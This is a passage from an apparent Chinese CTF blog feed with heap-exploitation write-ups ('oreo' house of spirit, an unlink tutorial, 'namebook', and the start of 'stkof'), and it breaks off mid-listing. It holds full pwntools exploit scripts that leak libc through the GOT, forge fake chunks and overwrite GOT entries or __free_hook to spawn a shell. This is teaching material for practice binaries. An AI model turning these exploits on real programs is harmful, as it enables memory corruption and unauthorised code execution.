class="line">&#125;</span><br><span class="line"></span><br><span class="line">分析得到的结构体, name及description存在明显的溢出。</span><br><span class="line"></span><br><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure></p><p>2.show</p><p>通过i-&gt;next遍历所有的malloc结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int show_rifles()</span><br><span class="line">&#123;</span><br><span class="line">  rifle *i; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);</span><br><span class="line">  for ( i = head; i; i = i-&gt;next )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Name: %s\n&quot;, i-&gt;name);</span><br><span class="line">    printf(&quot;Description: %s\n&quot;, i);</span><br><span class="line">    puts(&quot;===================================&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.message</p><p>给了一块0x80大小的可以写notice的内存，给了我们伪造bypass fakechunk检查的机会</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned int message()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // ST1C_4</span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;);</span><br><span class="line">  fgets(notice, 0x80, stdin);</span><br><span class="line">  cut_enter(notice);</span><br><span class="line">  return __readgsdword(0x14u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在上面的条件之下，我们便有了机会利用house of spirit 的机会，注意到bss段变量的存放顺序–&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A288 head          </span><br><span class="line">.bss:0804A288                                         </span><br><span class="line">.bss:0804A28C                </span><br><span class="line">.bss:0804A2A0 order_num      </span><br><span class="line">.bss:0804A2A0                                        </span><br><span class="line">.bss:0804A2A4 rifle_cnt      </span><br><span class="line">.bss:0804A2A4                                        </span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice         </span><br><span class="line">.bss:0804A2A8</span><br></pre></td></tr></table></figure><p>而程序中仅有固定的malloc(0x38)，分配出来的chunk size应该为0x41,我们可以想到，当malloc足够的chunk时，rifle_cnt将可以达到0x40，为了绕过free fastbin的检查我们就需要在notice中伪造nextchunk的pre_size 及size，这个很容易以做到。<br>伪造完成后，因为add中存在对name的溢出，那么如果将其溢出至rifle-&gt;next的位置，填入任一函数的got地址，那么在show时便足以泄露实际地址然后得到system，/bin/sh的地址。之后便将其溢出为fakechunk处，为之后的free做好准备。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./oreo&quot;</span><br><span class="line">oreo = ELF(&quot;./oreo&quot;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./oreo&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(descrip, name):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    #p.recvuntil(&apos;Rifle name: &apos;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    #p.recvuntil(&apos;Rifle description: &apos;)</span><br><span class="line">    #sleep(0.5)</span><br><span class="line">    p.sendline(descrip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_rifle():</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def message(notice):</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    #p.recvuntil(&quot;Enter any notice you&apos;d like to submit with your order: &quot;)</span><br><span class="line">    p.sendline(notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    print &apos;step 1. leak libc base&apos;</span><br><span class="line">    name = 27 * &apos;a&apos; + p32(oreo.got[&apos;puts&apos;])</span><br><span class="line">    add(25 * &apos;a&apos;, name)</span><br><span class="line">    show_rifle()</span><br><span class="line">    p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">    p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">    puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">    print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">    print &apos;step 2. free fake chunk at 0x0804A2A8&apos;</span><br><span class="line"></span><br><span class="line">    # now, oifle_cnt=1, we need set it = 0x40</span><br><span class="line">    oifle = 1</span><br><span class="line">    while oifle &lt; 0x3f:</span><br><span class="line">        # set next link=NULL</span><br><span class="line">        add(25 * &apos;a&apos;, &apos;a&apos; * 27 + p32(0))</span><br><span class="line">        oifle += 1</span><br><span class="line">    payload = &apos;a&apos; * 27 + p32(0x0804a2a8)</span><br><span class="line">    # set next link=0x0804A2A8, try to free a fake chunk</span><br><span class="line">    add(25 * &apos;a&apos;, payload)</span><br><span class="line">    # before free, we need to bypass some check</span><br><span class="line">    # fake chunk&apos;s size is 0x40</span><br><span class="line">    # 0x20 *&apos;a&apos; for padding the last fake chunk</span><br><span class="line">    # 0x40 for fake chunk&apos;s next chunk&apos;s prev_size</span><br><span class="line">    # 0x100 for fake chunk&apos;s next chunk&apos;s size</span><br><span class="line">    # set fake iofle&apos; next to be NULL</span><br><span class="line">    payload = 0x20 * &apos;\x00&apos; + p32(0x40) + p32(0x100)</span><br><span class="line">    payload = payload.ljust(52, &apos;b&apos;)</span><br><span class="line">    payload += p32(0)</span><br><span class="line">    payload = payload.ljust(128, &apos;c&apos;)</span><br><span class="line">    message(payload)</span><br><span class="line">    # fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span><br><span class="line">    order()</span><br><span class="line">    p.recvuntil(&apos;Okay order submitted!\n&apos;)</span><br><span class="line"></span><br><span class="line">    print &apos;step 3. get shell&apos;</span><br><span class="line">    # modify strlen@got to system addr                   // don&apos;t know why modified free@got addr could&apos;t get shell</span><br><span class="line">    payload = p32(oreo.got[&apos;strlen&apos;]).ljust(20, &apos;a&apos;)</span><br><span class="line">    add(payload, &apos;b&apos; * 20)</span><br><span class="line">    log.success(&apos;system addr: &apos; + hex(system_addr))</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    message(p32(system_addr) + &apos;;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.4-unlink</title>
      <link href="/2018/12/20/introduction-to-pwn2-4-unlink/"/>
      <url>/2018/12/20/introduction-to-pwn2-4-unlink/</url>
      <content type="html"><![CDATA[<p>之前看了好久的unlink，现在回来再看一下，顺便写个笔记</p><h1 id="unlink-原理"><a href="#unlink-原理" class="headerlink" title="unlink 原理"></a>unlink 原理</h1><p>  当创建几个满足smallbin大小的块时，如果有可能使数据溢出，那么在中间的一个chunk中可以伪造一个fakechunk，同时溢出至下一个chunk的头部，伪造pre_size为fakechunk的size，修改size处的标志位，使之认为前一个chunk为空。<br>  那么在free nextchunk(chunk2)时，因为unlink的机制，会先检查前一块chunk1是否为空，如果通过检验，那么便会将其卸下，之后再检查nextnextchunk(chunk3)，发现正在使用，则执行unlink</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">FD=P-&gt;fd</span><br><span class="line">BK=P-&gt;bk </span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>  这样的操作在正常情况下会将空闲chunk卸下，但是在这样的伪造情况下，chunk1中的fakechunk便会进入chunklist。而在前面绕过unlink检查时，我们修改了fd与bk指针，使得P-&gt;FD-&gt;BK = P, P-&gt;BK-&gt;FD = P；为了能够得到对指针的控制，我们倾向于将其指向chunk1的指针所放置的内存之上，之后再修改chunk1的内容，实质上便是在修改自己的指针放置的位置及之后的指针，从而修改got表或者malloc_hook或free_hook之类的达到get_shell的目的。</p><p>使用heap-exploitation的例子来见证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct chunk_structure &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct chunk_structure *fd;</span><br><span class="line">  struct chunk_structure *bk;</span><br><span class="line">  char buf[10];               // padding</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned long long *chunk1, *chunk2;</span><br><span class="line">struct chunk_structure *fake_chunk, *chunk2_hdr;</span><br><span class="line">char data[20];</span><br><span class="line"></span><br><span class="line">// First grab two chunks (non fast)</span><br><span class="line">chunk1 = malloc(0x80);        // Points to 0xa0e010</span><br><span class="line">chunk2 = malloc(0x80);        // Points to 0xa0e0a0</span><br><span class="line"></span><br><span class="line">// Assuming attacker has control over chunk1&apos;s contents</span><br><span class="line">// Overflow the heap, override chunk2&apos;s header</span><br><span class="line"></span><br><span class="line">// First forge a fake chunk starting at chunk1</span><br><span class="line">// Need to setup fd and bk pointers to pass the unlink security check</span><br><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P</span><br><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P</span><br><span class="line"></span><br><span class="line">// Next modify the header of chunk2 to pass all security checks</span><br><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);</span><br><span class="line">chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&apos;s data region size</span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~1;        // Unsetting prev_in_use bit</span><br><span class="line"></span><br><span class="line">// Now, when chunk2 is freed, attacker&apos;s fake chunk is &apos;unlinked&apos;</span><br><span class="line">// This results in chunk1 pointer pointing to chunk1 - 3</span><br><span class="line">// i.e. chunk1[3] now contains chunk1 itself.</span><br><span class="line">// We then make chunk1 point to some victim&apos;s data</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[3] = (unsigned long long)data;</span><br><span class="line"></span><br><span class="line">strcpy(data, &quot;Victim&apos;s data&quot;);</span><br><span class="line"></span><br><span class="line">// Overwrite victim&apos;s data using chunk1</span><br><span class="line">chunk1[0] = 0x002164656b636168LL;   // hex for &quot;hacked!&quot;</span><br><span class="line"></span><br><span class="line">printf(&quot;%s\n&quot;, data);         // Prints &quot;hacked!&quot;</span><br></pre></td></tr></table></figure><h1 id="namebook"><a href="#namebook" class="headerlink" title="namebook"></a>namebook</h1><p><em>h4lo大佬给的练习题，虽然相比后两个时间迟不久，但是因为比较简单，所以把插在前面</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>依旧是练习题。</p><p>四个功能： add delete reset show</p><p>add 大小限制十个 ， 固定malloc(0x10).<br>delete free完清空指针<br>reset 大小变为0x100 明显溢出<br>show 根据指针显示内容</p><p>保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec namebook</span><br><span class="line">[*] &apos;/home/sirius/tikool/prac/namebook/namebook&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先通过unlink 控制bss段存储指针的部分，然后泄露libc地址<br>有了libc地址之后复写malloc_hook 或free_hook 为one_gadget 就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./namebook&apos;)</span><br><span class="line">elf = ELF(&apos;./namebook&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(idx,name):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;name:&apos;,name)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def reset(idx,name):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;name:&apos;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0,&apos;a&apos;)</span><br><span class="line">allocate(1,&apos;b&apos;)</span><br><span class="line">allocate(2,&apos;c&apos;)</span><br><span class="line">allocate(3,&apos;d&apos;)</span><br><span class="line"></span><br><span class="line">ptr_addr = 0x602040</span><br><span class="line">#delete(1)</span><br><span class="line">reset(0,p64(0x90)+p64(0x80)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+&apos;a&apos;*0x60+p64(0x80)+p64(0x90))</span><br><span class="line">delete(1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">reset(0,&apos;a&apos;*0x18+p64(elf.got[&apos;puts&apos;])+p64(0x602040))</span><br><span class="line">show(0)</span><br><span class="line">puts_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;puts_addr: &apos;+hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[&apos;puts&apos;] </span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + 0x3c4b10</span><br><span class="line">print &apos;malloc_hook: &apos;+hex(malloc_hook)</span><br><span class="line">free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">print &apos;free_hook: &apos;+hex(free_hook)</span><br><span class="line">one_gadget = libc_base + 0x4526a</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">reset(1,p64(free_hook))</span><br><span class="line">reset(0,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>getshell结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">core  namebook    namebookwp.py</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>选项1：malloc_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 malloc_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char *v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  v2 = (char *)malloc(size);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  ::s[++index] = v2;                            // ::全局</span><br><span class="line">  printf(&quot;%d\n&quot;, (unsigned int)index, size);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项二：edit_chunk           //完全没考虑之前malloc时的大小，直接溢出就对了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 edit_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  int i; // eax</span><br><span class="line">  unsigned int index; // [rsp+8h] [rbp-88h]</span><br><span class="line">  __int64 size; // [rsp+10h] [rbp-80h]</span><br><span class="line">  char *ptr; // [rsp+18h] [rbp-78h]</span><br><span class="line">  char s; // [rsp+20h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+88h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  if ( index &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !::s[index] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = ::s[index];</span><br><span class="line">  for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( size )</span><br><span class="line">    result = 0xFFFFFFFFLL;</span><br><span class="line">  else</span><br><span class="line">    result = 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项三：free_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  v1 = atol(&amp;s);</span><br><span class="line">  if ( v1 &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !::s[v1] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  free(::s[v1]);</span><br><span class="line">  ::s[v1] = 0LL;                                // free and make it be 0</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>基本上没什么分析的。。。漏洞很明显，就是在告诉你来unlink。</p><p>思路就是malloc几个smallbin大小的chunk，之后伪造fakechunk unlink，<br>之后edit被伪造的fakechunk的chunk，修改free，atoi的got表，调用system(“/bin/sh”)获得shell<br>1.利用unlink修改修改GOT表。<br>2.泄露libc基址。<br>3.将free_got改成system_addr.<br>4.free一个内存块，其中的内容是”/bin/sh”。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 